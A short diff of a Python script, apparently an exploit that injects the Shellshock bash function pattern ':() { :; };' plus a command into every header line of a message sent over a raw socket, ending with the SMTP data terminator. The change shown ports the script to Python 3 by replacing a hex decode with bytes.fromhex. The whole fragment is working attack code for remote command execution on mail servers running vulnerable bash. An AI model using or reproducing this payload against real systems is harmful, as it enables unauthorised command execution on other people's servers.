@@ -63,6 +63,7 @@ s.send(data)
 s.recv(2048*4)
 
 data = b""  # Inicializar data como un objeto de tipo bytes
+
 for h in headers:
     header_line = h + ":() { :; };" + cmd + "\n"
     data += netFormat(header_line)
@@ -70,7 +71,7 @@ for h in headers:
 data += netFormat(cmd)
 
 # <CR><LF>.<CR><LF>
-data += "0d0a2e0d0a".decode('hex')
+data += bytes.fromhex("0d0a2e0d0a")
 
 s.send(data)
 s.recv(2048*4)
